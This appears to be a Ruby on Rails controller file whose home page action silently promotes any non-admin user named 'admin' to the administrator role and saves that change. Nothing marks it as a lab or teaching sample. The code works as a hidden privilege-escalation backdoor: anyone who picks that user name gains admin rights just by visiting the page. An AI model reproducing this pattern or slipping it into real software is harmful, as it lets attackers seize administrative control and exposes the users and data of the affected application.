class HomeController < ApplicationController
  layout 'standard'
  def index
  @user = current_user
  if @user.admin? == false && @user.name == 'admin'
    @user.role = 'admin'
    @user.save
  end
  end
end
